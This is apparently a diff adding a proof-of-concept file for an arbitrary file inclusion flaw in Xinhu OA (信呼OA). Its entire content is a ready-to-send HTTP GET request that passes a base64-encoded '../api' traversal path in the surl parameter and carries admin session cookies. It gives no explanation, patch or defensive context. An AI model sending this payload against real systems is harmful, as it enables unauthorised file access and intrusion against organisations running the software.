@@ -1,0 +1,10 @@
+# 信呼OA任意文件包含漏洞
+GET /?m=index&a=getshtml&surl=Li4vYXBp&qhaeshs=7152632903992606721 HTTP/1.1
+Host: www.byp-test.com:8080
+Accept-Language: zh-CN
+Timeoffset: -28800000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: application/json, text/plain, */*
+Cookie: PHPSESSID=78j28htugrac0cok387d013lbt; xinhu_ca_adminpass=dd0cv0dt0lpp0dw0lxj0dc0llc0jc0cl0ac0ac02; xinhu_ca_adminuser=admin; xinhu_mo_adminid=qh0hy0yj0way0qh0yw0yh0rd0yy0ra0wda0waj0yy0wau0waj0war07
+Accept-Encoding: gzip, deflate
+
